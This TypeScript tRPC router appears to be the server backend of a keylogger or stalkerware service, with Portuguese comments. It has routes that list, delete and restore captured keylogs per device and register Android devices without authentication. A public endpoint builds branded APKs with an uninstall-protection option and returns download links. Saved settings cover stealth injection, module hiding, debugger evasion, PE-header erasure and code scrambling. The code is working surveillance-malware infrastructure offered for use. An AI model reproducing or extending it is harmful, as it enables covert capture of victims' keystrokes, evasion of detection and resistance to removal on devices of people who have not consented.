import { z } from "zod";
import fs from "fs";
import path from "path";

import { storagePut } from "./storage";
import { TRPCError } from "@trpc/server";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { buildCustomAPK } from "./apk-builder";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await deleteKeylog(input.keylogId);
      }),
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await restoreKeylog(input.keylogId);
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .query(async () => {
        return await getAlerts();
      }),
  }),

  events: router({
    list: protectedProcedure
      .query(async () => {
        return await getEvents();
      }),
  }),

  apk: router({
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
        protectFromUninstall: z.boolean().default(true),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          // Usar o gerador de APK customizado
          const result = await buildCustomAPK({
            companyName: input.companyName,
            companyUrl: input.companyUrl,
            logoUrl: input.logoUrl,
            protectFromUninstall: input.protectFromUninstall,
          });

          if (!result.success || !result.downloadUrl) {
            throw new Error(result.error || "Erro ao gerar APK");
          }

          // Retornar URL de download
          return {
            success: true,
            downloadUrl: `https://remote-monitor-production.up.railway.app${result.downloadUrl}`,
            message: "APK gerado com sucesso!",
          };
        } catch (error) {
          console.error("Erro ao gerar APK:", error);
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),

  settings: router({
    save: protectedProcedure
      .input(z.object({
        processName: z.string().optional(),
        modulePath: z.string().optional(),
        stealthInject: z.number().optional(),
        hideModule: z.number().optional(),
        hideFromDebugger: z.number().optional(),
        autoInject: z.number().optional(),
        scramble: z.number().optional(),
        erasePE: z.number().optional(),
        removeDebugData: z.number().optional(),
        delay: z.number().optional(),
        delayBetween: z.number().optional(),
        injectMethod: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await saveSettings(ctx.user.id, input as any);
      }),
    
    get: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await getSettings(ctx.user.id);
      }),
  }),

  monitoring: router({
    toggleService: protectedProcedure
      .input(z.object({
        enabled: z.boolean(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return {
          success: true,
          enabled: input.enabled,
          message: `MonitoringService ${input.enabled ? 'ativado' : 'desativado'}`,
        };
      }),
  }),

  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        deviceName: z.string(),
        deviceModel: z.string(),
        androidVersion: z.string(),
        appName: z.string(),
        appVersion: z.string(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('Dispositivo registrado:', input);
          
          return {
            success: true,
            message: 'Dispositivo registrado com sucesso',
            deviceId: input.deviceId,
          };
        } catch (error) {
          console.error('Erro ao registrar dispositivo:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao registrar dispositivo',
          });
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
